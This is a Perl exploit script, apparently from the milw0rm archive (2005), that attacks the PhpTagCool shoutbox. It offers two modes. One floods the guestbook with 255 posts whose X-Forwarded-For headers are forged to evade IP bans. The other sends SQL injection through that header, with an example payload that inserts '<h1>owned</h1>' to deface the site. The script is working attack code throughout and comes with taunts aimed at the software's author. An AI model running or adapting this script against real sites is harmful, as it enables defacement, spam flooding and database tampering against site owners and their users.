#!/usr/bin/perl
##  PhpTagCool Zatueritor 1.0
##  Copyright: Megabyte www.mbytesecurity.org
##  Greetz: Rootbox for discovering the forwarded-for issue
##  Te amo Pandora
##  Crashcool,fuiste defaceado por un bug de tu propia programacion,ahora que inventaras?
 
use IO::Socket;
 
$x = 0;
 
print q(
PhpTagCool Zatueritor 1.0
by Megabyte
 
);
print q(Host |sin http://www.| );
$host = <STDIN>;
chop ($host);
 
print q(Ruta |ejemplo. /phptagcool/ o /| );
$pth = <STDIN>;
chop ($pth);
 
print q(Tipo de Atake |1 = Posteo Masivo, 2 = Injeccion SQL| );
$type = <STDIN>;
chop ($type);
 
## The Flood Attack
if($type == 1){
 
 
while($x != 255)
{
 
 
$nick = "nick=megabyte";
 
## We generate our own ip address so we won't be banned  :) 
$ip = "127.0.0" . "$x";
 
 
$postit = "$nick"."&url=http%3A%2F%2Fwww.mbytesecurity.org&mensaje=FloodingLam
eTag&Submit=Enviar";
 
 
$lrg = length $postit;
 
 
my $sock = new IO::Socket::INET (
                                 PeerAddr => "$host",
                                 PeerPort => "80",
                                 Proto => "tcp",
                                );
die "\nNo se pudo conectar  :(  $!\n" unless $sock;
 
## We Fake the X-Forwarded-For header,so we can post with multiple ip's
print $sock "POST $pth"."mensajes.php HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwav
e-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n";
print $sock "Referer: $host\n";
print $sock "Accept-Language: en-us\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "Accept-Encoding: gzip, deflate\n";
print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox
/1.0.4\n";
print $sock "X-Forwarded-For: $ip\n";
print $sock "Connection: Keep-Alive\n";
print $sock "Cache-Control: no-cache\n";
print $sock "Content-Length: $lrg\n\n";
print $sock "$postit\n";
close($sock);
 
 
syswrite STDOUT, ".";
 
 
$x++;
}
 
## The SQL injection attack  :) 
}
elsif ($type == 2){
 
print q(Inyeccion a ejecutar Ejemplo 127.0.0.1'),('<h1>owned</h1>','http://mbytesecurity.
org','leim','hoy','11 );
$sql = <STDIN>;
chop ($sql);
 
 
 
my $sock = new IO::Socket::INET (
                                 PeerAddr => "$host",
                                 PeerPort => "80",
                                 Proto => "tcp",
                                );
die "\nNo se pudo conectar  :(  $!\n" unless $sock;
 
 
print $sock "POST $pth"."mensajes.php HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q
=0.8,image/png,*/*;q=0.5\n";
print $sock "Referer: $host\n";
print $sock "Accept-Language: en-us\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "Accept-Encoding: gzip, deflate\n";
print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox
/1.0.4\n";
print $sock "Connection: Keep-Alive\n";
print $sock "Cache-Control: no-cache\n";
print $sock "Content-Length: $lrg\n\n";
print $sock "X-Forwarded-For: $sql\n";
close($sock);
 
}else{
 
	die "Solo hay 2 opciones IMBECIL\n";
}

# milw0rm.com [2005-09-11]
